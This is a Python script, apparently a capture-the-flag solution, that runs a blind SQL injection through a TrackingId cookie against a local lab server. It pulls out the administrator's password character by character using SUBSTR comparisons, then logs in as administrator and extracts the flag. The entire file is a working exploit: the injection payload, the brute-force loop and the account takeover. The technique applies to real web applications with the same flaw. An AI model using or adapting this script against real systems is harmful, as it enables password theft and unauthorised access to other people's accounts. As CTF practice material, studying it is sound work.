import requests
import string
import sys
import re

url = "http://localhost:1337/"

# The password is exactly 12 characters, lowercase + numbers
charset = string.ascii_lowercase + string.digits

print("[*] Starting Blind SQL Injection (PortSwigger style)...")
print(f"[*] Target: {url}")
print("[*] Recovered Password: ", end="", flush=True)

password = ""

for i in range(1, 13):
    found_char = False
    
    for c in charset:
        # Payload: ' AND (SELECT SUBSTR(password, i, 1) FROM users WHERE username='administrator') = 'c
        payload = f"base-tracking-id-123' AND (SELECT SUBSTR(password, {i}, 1) FROM users WHERE username='administrator') = '{c}' --"
        
        cookies = {"TrackingId": payload}
        
        r = requests.get(url, cookies=cookies)
        
        # Check if the query returned True
        if "Valid tracking signature detected" in r.text:
            password += c
            print(c, end="", flush=True)
            found_char = True
            break
            
    if not found_char:
        print("\n\n[-] Failed to find character. Exiting.")
        sys.exit(1)

print("\n\n[+] Password fully recovered!")
print(f"[*] Logging in as administrator with password '{password}'...")

# Now log in to get the flag
login_data = {
    "username": "administrator",
    "password": password
}
r_login = requests.post(url + "login", data=login_data, cookies={"TrackingId": "base-tracking-id-123"})

if "InvataCyber" in r_login.text:
    # Extract the flag from the HTML using regex
    flag = re.search(r'(InvataCyber\{.*?\})', r_login.text).group(1)
    print(f"\n[+] SUCCESS! Flag retrieved: {flag}")
else:
    print("\n[-] Login failed.")
